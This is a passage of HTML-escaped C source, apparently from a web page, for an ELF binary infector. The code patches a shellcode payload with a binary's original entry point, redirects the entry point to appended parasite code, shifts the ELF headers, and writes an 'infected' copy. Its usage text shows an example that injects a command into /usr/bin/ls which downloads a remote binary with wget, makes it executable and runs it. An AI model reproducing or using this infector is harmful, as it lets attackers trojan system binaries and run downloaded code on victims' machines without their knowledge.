class=\"string\"\u003e\u0026#34;************************************************************\\n\\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einjector_usage\u003c/span\u003e\u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *argvz )\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;Usage : %s -s \u0026lt;sourcefile\u0026gt; -d \u0026lt;destinationfile\u0026gt; -c \u0026lt;command\u0026gt;\\n\u0026#34;\u003c/span\u003e, argvz );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\tOptions : \\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\t\\t-s \u0026lt;sourcefile\u0026gt;      : file to infect with the arbitrary command .\\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\t\\t-d \u0026lt;destinationfile\u0026gt; : destination file name for infection .\\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\t\\t-c \u0026lt;command\u0026gt;         : shell command to inject .\\n\\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\tExample : \\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\t\\t%s -s /usr/bin/ls -d ./ls_infected -c \\\u0026#34;wget http://www.site.com/binary \u0026amp;\u0026amp; chmod +x binary \u0026amp;\u0026amp; ./binary\\\u0026#34; \\n\\n\u0026#34;\u003c/span\u003e, argvz );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003edie\u003c/span\u003e\u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e line )\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;ERROR : line %d : %s\\n\u0026#34;\u003c/span\u003e, line, strerror(errno) );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eexit\u003c/span\u003e(EXIT_FAILURE);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e/*      This function searches for \u0026#39;mov ebp,0 - jmp ebp\u0026#39; into shellcode payload */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"title\"\u003efind_reentry_offset\u003c/span\u003e\u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *code, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e size )\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e pattern[] = \u003cspan class=\"string\"\u003e\u0026#34;\\xbd\\x00\\x00\\x00\\x00\\xff\\xe5\u0026#34;\u003c/span\u003e; \u003cspan class=\"comment\"\u003e/* mov ebp,0 - jmp ebp */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e  offset,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         pattern_size = \u003cspan class=\"number\"\u003e7\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                         end_offset   = size - pattern_size;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( offset = \u003cspan class=\"number\"\u003e0\u003c/span\u003e; offset \u0026lt; end_offset; offset++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( \u003cspan class=\"built_in\"\u003ememcmp\u003c/span\u003e( \u0026amp;code[offset], pattern, pattern_size ) == \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e offset + \u003cspan class=\"number\"\u003e1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"number\"\u003e-1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003edump_hex\u003c/span\u003e\u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *buff, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e offset, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e n )\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e i;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( i = offset; i \u0026lt; offset + n; i++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( \u003cspan class=\"built_in\"\u003eisprint\u003c/span\u003e((\u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e)buff[i]) ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;%.2c \u0026#34;\u003c/span\u003e, (\u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e)buff[i] );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;0x%.2X \u0026#34;\u003c/span\u003e, (\u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e)buff[i] );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( (i % \u003cspan class=\"number\"\u003e5\u003c/span\u003e) == \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){ \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;\\n\u0026#34;\u003c/span\u003e ); }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e/* main injection routine :\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *      sourcefile         : original elf file name .\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *  infectedfile       : destination file name .\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *  asm_payload        : shellcode to inject .\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e *  asm_reentry_offset : offset of \u0026#39;mov ebp,0 - jmp ebp\u0026#39; into shellcode (it\u0026#39;s going to be patched) .\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"title\"\u003einject_elf_code\u003c/span\u003e\u003cspan class=\"params\"\u003e( \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *sourcefile, \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *infectedfile, \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *asm_payload, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e asm_len, \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e asm_reentry_offset )\u003c/span\u003e\u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e    srcsize;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e * srcbuffer;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        Elf32_Ehdr *elf_header;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        Elf32_Phdr *program_headers;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        Elf32_Shdr *section_headers;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"class\"\u003e\u003cspan class=\"keyword\"\u003estruct\u003c/span\u003e \u003cspan class=\"title\"\u003estat\u003c/span\u003e \u003cspan class=\"title\"\u003estat\u003c/span\u003e;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eint\u003c/span\u003e         i_fd, i,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                move = \u003cspan class=\"number\"\u003e0\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                parasite_offset,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                bss_len,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                o_fd,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                zero=\u003cspan class=\"number\"\u003e0\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( (i_fd = open( sourcefile, O_RDWR )) == \u003cspan class=\"number\"\u003e-1\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( fstat( i_fd, \u0026amp;stat ) \u0026lt; \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        srcsize = stat.st_size;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ Original file size           : %d bytes .\\n\u0026#34;\u003c/span\u003e, srcsize );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* read original file into a buffer */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        srcbuffer = (\u003cspan class=\"keyword\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"keyword\"\u003echar\u003c/span\u003e *)\u003cspan class=\"built_in\"\u003emalloc\u003c/span\u003e(srcsize);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( read( i_fd, srcbuffer, srcsize ) != srcsize ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        close(i_fd);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        elf_header = (Elf32_Ehdr *)srcbuffer;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* Here we are going to take original elf entry point offset to\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 * patch shellcode, so that :\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *      \u0026#39;mov ebp,0 - jmp ebp\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 * will become :\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *  \u0026#39;mov ebp,\u0026lt;entry_point\u0026gt; - jmp ebp\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 *\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 * to jump at the original elf code .\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e                 */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ Old entry point              : 0x%X .\\n\u0026#34;\u003c/span\u003e, elf_header-\u0026gt;e_entry );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ Patching shellcode at offset : 0x%X ( \u0026#34;\u003c/span\u003e, asm_reentry_offset );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        dump_hex( asm_payload, asm_reentry_offset, \u003cspan class=\"number\"\u003e4\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;-\u0026gt; \u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        *(\u003cspan class=\"keyword\"\u003eint\u003c/span\u003e*)\u0026amp;asm_payload[asm_reentry_offset] = elf_header-\u0026gt;e_entry;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        dump_hex( asm_payload, asm_reentry_offset, \u003cspan class=\"number\"\u003e4\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;) .\\n\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* compute new elf header info and data for headers relocation */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        program_headers = (Elf32_Phdr *)(srcbuffer + elf_header-\u0026gt;e_phoff);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e; i \u0026lt; elf_header-\u0026gt;e_phnum; i++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( program_headers-\u0026gt;p_type != PT_DYNAMIC ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( program_headers-\u0026gt;p_type == PT_LOAD \u0026amp;\u0026amp; program_headers-\u0026gt;p_offset ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                        parasite_offset     = program_headers-\u0026gt;p_offset + program_headers-\u0026gt;p_filesz;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                            elf_header-\u0026gt;e_entry = program_headers-\u0026gt;p_memsz  + program_headers-\u0026gt;p_vaddr;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                            bss_len             = program_headers-\u0026gt;p_memsz  - program_headers-\u0026gt;p_filesz;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                            \u003cspan class=\"keyword\"\u003ebreak\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                ++program_headers;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ New entry point              : 0x%X .\\n\u0026#34;\u003c/span\u003e, elf_header-\u0026gt;e_entry );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* update elf section headers */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        section_headers = (Elf32_Shdr *)(srcbuffer + elf_header-\u0026gt;e_shoff);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e; i \u0026lt; elf_header-\u0026gt;e_shnum; i++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( section_headers-\u0026gt;sh_offset \u0026gt;= parasite_offset ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        section_headers-\u0026gt;sh_offset += asm_len + bss_len;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                ++section_headers;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* update elf program headers */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        program_headers = (Elf32_Phdr *)(srcbuffer + elf_header-\u0026gt;e_phoff);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e; i \u0026lt; elf_header-\u0026gt;e_phnum; i++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( program_headers-\u0026gt;p_type != PT_DYNAMIC ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e(move){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                program_headers-\u0026gt;p_offset += asm_len + bss_len;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( program_headers-\u0026gt;p_type == PT_LOAD \u0026amp;\u0026amp; program_headers-\u0026gt;p_offset ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                program_headers-\u0026gt;p_filesz += asm_len + bss_len;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                program_headers-\u0026gt;p_memsz  += asm_len + bss_len;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                                move = \u003cspan class=\"number\"\u003e1\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                ++program_headers;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"comment\"\u003e/* update elf header with new parasite code offset and write relocated data to the destination file */\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        elf_header-\u0026gt;e_shoff += (elf_header-\u0026gt;e_shoff \u0026gt;= parasite_offset ? asm_len + bss_len : \u003cspan class=\"number\"\u003e0\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        elf_header-\u0026gt;e_phoff += (elf_header-\u0026gt;e_phoff \u0026gt;= parasite_offset ? asm_len + bss_len : \u003cspan class=\"number\"\u003e0\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprintf\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#34;@ Creating infected file       : \u0026#39;%s\u0026#39; .\\n\u0026#34;\u003c/span\u003e, infectedfile );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( (o_fd = open( infectedfile, O_WRONLY|O_CREAT|O_EXCL, stat.st_mode )) \u0026lt; \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( write( o_fd, srcbuffer, parasite_offset ) \u0026lt; \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e( i = \u003cspan class=\"number\"\u003e0\u003c/span\u003e; i \u0026lt; bss_len; i++ ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                write( o_fd, \u0026amp;zero, \u003cspan class=\"number\"\u003e1\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( write( o_fd, asm_payload, asm_len ) \u0026lt; \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                die( __LINE__ );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( write( o_fd, srcbuffer + parasite_offset, 